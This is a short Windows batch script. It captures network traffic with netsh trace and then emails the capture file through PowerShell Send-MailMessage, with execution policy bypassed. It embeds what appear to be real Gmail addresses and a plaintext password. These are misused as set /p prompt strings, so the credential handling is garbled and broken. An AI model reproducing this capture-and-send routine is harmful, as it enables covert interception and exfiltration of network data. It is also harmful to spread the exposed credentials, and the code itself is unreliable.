@echo off

REM Start capturing network traffic and save it to a file
netsh trace start capture=yes tracefile=C:\path\to\capture.etl maxsize=1024

REM Wait for a moment to capture some traffic (adjust the duration as needed)
timeout /t 10

REM Stop capturing network traffic
netsh trace stop

REM Prompt the user to enter the email account credentials
set /p sender_email=xqmzex@gmail.com:
set /p sender_password=GreenBottleCap:
set /p recipient_email=marcolanch@gmail.com:

REM Send email with captured data
powershell.exe -ExecutionPolicy Bypass -Command "Send-MailMessage -SmtpServer smtp.example.com -From %sender_email% -To %recipient_email% -Subject 'Captured Network Traffic' -Body 'Please find attached the captured network traffic.' -Attachments 'C:\path\to\capture.etl' -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList '%sender_email%', (ConvertTo-SecureString '%sender_password%' -AsPlainText -Force))"
